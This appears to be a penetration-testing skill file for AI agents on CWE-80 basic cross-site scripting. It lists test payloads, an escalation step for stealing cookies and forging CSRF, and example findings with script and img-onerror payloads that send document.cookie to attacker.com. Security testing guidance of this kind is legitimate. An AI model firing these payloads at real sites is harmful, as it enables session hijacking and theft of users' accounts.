
name: cwe-80-basic-xss-html-tags
description: Use when a web injection sink accepts CWE input.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-80, injection, a05, pentest, owasp]
category: pentesting-skills
related_skills:
  - owasp-a05-injection
---

# CWE-80 - Basic Cross-Site Scripting (HTML Tags)

CWE-80: an HTML tag from user input is reflected in output, allowing script execution or DOM manipulation.

## Parent Skill

This is a sub-skill of `owasp-a05-injection` (OWASP A05 Injection, Top 10 2025).
Load the parent for overall A05 scope, the test procedure, and validation criteria
(negative control). This skill covers the CWE-80 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- When an HTML tag is reflected in the page and the context allows it to execute or alter the DOM.

## Detection & Test

1. **Identify the tag.** Find which HTML tags are reflected (script, img, svg, object, body).
2. **Test dangerous tags.** Inject `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`.
3. **Confirm execution.** Verify the tag executes in the browser.
4. **Escalate.** Use the XSS to steal cookies, forge a CSRF, or pivot to a higher-privilege context.
5. **Document the tag, context, and proof.

## Example Findings

- `<script>document.location='//attacker.com/?c='+document.cookie</script>` in a search box.
- `<img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>` in a profile name.

## Impact

- Data disclosure, logic manipulation, or code execution through the injection point.
- Privilege escalation or session hijack if the injection reaches auth/session logic.
- Persistence until the sink is parameterized or the input is validated.
- Lateral movement when the same unsanitized sink repeats across endpoints.

## See Also

- `owasp-a05-injection` - parent skill (A05 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).